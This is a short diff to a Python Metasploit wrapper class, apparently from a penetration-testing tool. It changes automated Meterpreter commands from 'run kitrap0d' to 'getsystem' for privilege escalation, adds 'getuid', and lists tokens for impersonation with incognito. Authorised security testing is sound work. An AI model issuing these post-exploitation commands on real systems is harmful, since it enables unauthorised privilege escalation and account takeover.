@@ -448,23 +448,25 @@ class Metasploit:
         proc.stdin.write("use priv\n")
         proc.stdin.write("use sniffer\n")
         proc.stdin.write("sysinfo\n")
+        proc.stdin.write("getuid\n")
 
         if conf.privEsc:
             print
 
-            infoMsg  = "trying to escalate privileges using "
-            infoMsg += "kitrap0d script"
+            infoMsg  = "trying to escalate privileges using Meterpreter"
+            infoMsg += "'getsystem' command which tries different "
+            infoMsg += "techniques, including kitrap0d"
             logger.info(infoMsg)
 
-            proc.stdin.write("run kitrap0d\n")
+            proc.stdin.write("getsystem\n")
 
             infoMsg  = "displaying the list of Access Tokens availables. "
             infoMsg += "Choose which user you want to impersonate by "
-            infoMsg += "using incognito's command 'impersonate_token'"
+            infoMsg += "using incognito's command 'impersonate_token' if "
+            infoMsg += "'getsystem' did not success to elevate privileges"
             logger.info(infoMsg)
 
             proc.stdin.write("list_tokens -u\n")
-
             proc.stdin.write("getuid\n")
 
 
